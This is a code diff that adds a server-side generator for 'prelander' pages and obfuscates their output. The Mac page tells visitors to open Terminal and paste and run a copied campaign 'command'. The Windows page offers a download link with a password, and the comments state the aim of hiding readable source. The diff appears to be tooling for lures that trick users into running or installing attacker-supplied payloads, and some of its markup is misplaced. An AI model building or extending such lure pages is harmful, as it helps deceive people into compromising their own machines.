@@ -1151,6 +1151,119 @@ async def prelander_bootstrap(
         return await _denied_response(request)
 
 
+def _render_built_in_prelander(os: str, offer_url: str, password: Optional[str], template: dict) -> str:
+    """
+    Render built-in Windows or Mac prelander layouts as server-side HTML.
+    
+    This prevents exposing readable React source code by generating minified
+    HTML on the backend instead of client-side rendering.
+    
+    Args:
+        os: 'windows' or 'mac'
+        offer_url: Campaign URL
+        password: Optional password to display
+        template: Template customization fields (title, subtitle, etc.)
+    
+    Returns:
+        Complete HTML document
+    """
+    # Template customization
+    if os == 'mac':
+        title = template.get('title') or 'How to open Terminal on Mac'
+        subtitle = template.get('subtitle') or ''
+        button_text = template.get('button_text') or 'Copy'
+        
+        # Mac Terminal Layout
+        return f'''<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width,initial-scale=1.0">
+<title>{title}</title>
+<style>
+*{{margin:0;padding:0;box-sizing:border-box;}}
+body{{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,Oxygen,Ubuntu,Cantarell,sans-serif;background:#f5f5f7;padding:20px;}}
+.container{{max-width:800px;margin:0 auto;}}
+.card{{background:#fff;border-radius:16px;box-shadow:0 8px 30px rgba(0,0,0,.08);padding:32px;margin-bottom:24px;}}
+.icon{{width:56px;height:56px;border-radius:50%;background:#1f1f1f;display:flex;align-items:center;justify-center:center;margin:0 auto 20px;}}
+.icon svg{{width:28px;height:28px;}}
+h1{{font-size:24px;color:#1f1f1f;text-align:center;margin-bottom:24px;}}
+.cmd-box{{display:flex;gap:8px;background:#1f1f1f;border-radius:12px;padding:4px;}}
+.cmd-text{{flex:1;padding:12px;font-family:monospace;font-size:14px;color:#22c55e;overflow:hidden;text-overflow:ellipsis;white-space:nowrap;}}
+.cmd-text::before{{content:'$ ';color:#666;}}
+button{{padding:12px 24px;background:#333;color:#fff;border:none;border-radius:10px;font-weight:600;cursor:pointer;}}
+button:hover{{background:#444;}}
+.steps{{margin-top:24px;}}
+.step{{display:flex;gap:12px;margin-bottom:16px;}}
+.step-num{{flex-shrink:0;width:28px;height:28px;border-radius:50%;background:#3b82f6;color:#fff;display:flex;align-items:center;justify-content:center;font-size:14px;font-weight:700;}}
+.step-text{{padding-top:4px;font-size:14px;color:#333;}}
+kbd{{padding:2px 6px;background:#f3f4f6;border:1px solid#d1d5db;border-radius:4px;font-family:monospace;font-size:12px;}}
+{"<div class='card'><div style='display:flex;align-items:center;gap:12px;background:#fef3c7;border:1px solid #fbbf24;border-radius:12px;padding:12px;'><svg width='20' height='20' fill='#d97706'><path d='M10 2a8 8 0 100 16 8 8 0 000-16zM9 5h2v6H9V5zm0 8h2v2H9v-2z'/></svg><span style='font-family:monospace;font-weight:700;color:#92400e;letter-spacing:1px;'>{password}</span></div></div>" if password else ""}
+</style>
+</head>
+<body>
+<div class="container">
+<div class="card">
+<div class="icon"><svg fill="#22c55e" viewBox="0 0 24 24"><path d="M20 4H4c-1.1 0-2 .9-2 2v12c0 1.1.9 2 2 2h16c1.1 0 2-.9 2-2V6c0-1.1-.9-2-2-2zM7.5 11h-2v2h-1v-2h-2v-1h2V8h1v2h2v1zm6.5 4c-.55 0-1-.45-1-1s.45-1 1-1 1 .45 1 1-.45 1-1 1zm0-3c-.55 0-1-.45-1-1s.45-1 1-1 1 .45 1 1-.45 1-1 1zm3 3c-.55 0-1-.45-1-1s.45-1 1-1 1 .45 1 1-.45 1-1 1zm0-3c-.55 0-1-.45-1-1s.45-1 1-1 1 .45 1 1-.45 1-1 1z"/></svg></div>
+<h1>{title}</h1>
+<div class="cmd-box">
+<div class="cmd-text">{offer_url}</div>
+<button onclick="navigator.clipboard.writeText('{offer_url}');this.textContent='Copied!';setTimeout(()=>this.textContent='{button_text}',2000);">{button_text}</button>
+</div>
+<div class="steps">
+<div class="step"><div class="step-num">1</div><div class="step-text">Press <kbd>⌘</kbd> + <kbd>Space</kbd> to open Spotlight Search</div></div>
+<div class="step"><div class="step-num">2</div><div class="step-text">Type <strong>"Terminal"</strong> and press <kbd>Return</kbd></div></div>
+<div class="step"><div class="step-num">3</div><div class="step-text">Paste the command above and press <kbd>Return</kbd></div></div>
+</div>
+</div>
+</div>
+</body>
+</html>'''
+    else:
+        # Windows Download Layout
+        title = template.get('title') or 'Your file is ready to download'
+        subtitle = template.get('subtitle') or 'Your file is prepared. Copy the link to download.'
+        button_text = template.get('button_text') or 'Copy'
+        
+        return f'''<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width,initial-scale=1.0">
+<title>Download Ready</title>
+<style>
+*{{margin:0;padding:0;box-sizing:border-box;}}
+body{{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,Oxygen,Ubuntu,Cantarell,sans-serif;background:#f0f2f5;display:flex;align-items:center;justify-content:center;min-height:100vh;padding:20px;}}
+.card{{background:#fff;border-radius:16px;box-shadow:0 8px 30px rgba(0,0,0,.08);max-width:500px;width:100%;padding:40px;}}
+.icon{{width:56px;height:56px;border-radius:50%;background:#10b981;display:flex;align-items:center;justify-content:center;margin:0 auto 20px;}}
+.icon svg{{width:28px;height:28px;fill:#fff;}}
+h1{{font-size:22px;color:#111;text-align:center;margin-bottom:8px;}}
+p{{font-size:14px;color:#666;text-align:center;margin-bottom:24px;}}
+.link-box{{display:flex;gap:8px;background:#f9fafb;border:1px solid #e5e7eb;border-radius:12px;padding:4px;margin-bottom:16px;}}
+.url{{flex:1;padding:12px;font-family:monospace;font-size:13px;color:#374151;overflow:hidden;text-overflow:ellipsis;white-space:nowrap;}}
+button{{padding:12px 20px;background:#111;color:#fff;border:none;border-radius:10px;font-weight:600;cursor:pointer;font-size:13px;}}
+button:hover{{background:#1f2937;}}
+.pwd{{display:flex;align-items:center;gap:12px;background:#fef3c7;border:1px solid #fbbf24;border-radius:12px;padding:14px;margin-top:16px;}}
+.pwd svg{{width:18px;height:18px;fill:#d97706;flex-shrink:0;}}
+.pwd-text{{font-family:monospace;font-weight:700;color:#92400e;letter-spacing:2px;}}
+</style>
+</head>
+<body>
+<div class="card">
+<div class="icon"><svg viewBox="0 0 24 24"><path d="M19 9h-4V3H9v6H5l7 7 7-7zM5 18v2h14v-2H5z"/></svg></div>
+<h1>{title}</h1>
+<p>{subtitle}</p>
+<label style="display:block;font-size:11px;font-weight:600;color:#6b7280;text-transform:uppercase;letter-spacing:0.5px;margin-bottom:8px;">Download Link</label>
+<div class="link-box">
+<div class="url">{offer_url}</div>
+<button onclick="navigator.clipboard.writeText('{offer_url}');this.textContent='Copied!';setTimeout(()=>this.textContent='{button_text}',2000);">{button_text}</button>
+</div>
+{"<div class='pwd'><svg viewBox='0 0 24 24'><path d='M18 8h-1V6c0-2.76-2.24-5-5-5S7 3.24 7 6v2H6c-1.1 0-2 .9-2 2v10c0 1.1.9 2 2 2h12c1.1 0 2-.9 2-2V10c0-1.1-.9-2-2-2zM9 6c0-1.66 1.34-3 3-3s3 1.34 3 3v2H9V6z'/></svg><span class='pwd-text'>{password}</span></div>" if password else ""}
+</div>
+</body>
+</html>'''
+
+
 async def _get_prelander_data(
     request: Request,
     os: str,
@@ -1433,4 +1546,27 @@ async def _get_prelander_data(
                 response["rendered_html"] = obfuscate_html_javascript(rendered_html, aggressive=False)
             except Exception as e:
                 logger.warning("[PRELANDER] Server-side template render failed: %s", e)
+        else:
+            # NEW: Even when there's no custom HTML template, render built-in
+            # layouts server-side to prevent exposing readable React source.
+            # This closes the gap where simple templates were client-rendered.
+            from app.utils.js_obfuscator import obfuscate_html_javascript
+            try:
+                built_in_html = _render_built_in_prelander(
+                    os_lower, offer_url, password, response.get("template", {})
+                )
+                response["rendered_html"] = obfuscate_html_javascript(built_in_html, aggressive=False)
+            except Exception as e:
+                logger.warning("[PRELANDER] Built-in template render failed: %s", e)
+    else:
+        # No template doc at all — render built-in fallback server-side
+        from app.utils.js_obfuscator import obfuscate_html_javascript
+        try:
+            built_in_html = _render_built_in_prelander(
+                os_lower, offer_url, password, {}
+            )
+            response["rendered_html"] = obfuscate_html_javascript(built_in_html, aggressive=False)
+        except Exception as e:
+            logger.warning("[PRELANDER] Built-in fallback render failed: %s", e)
+    
     return response
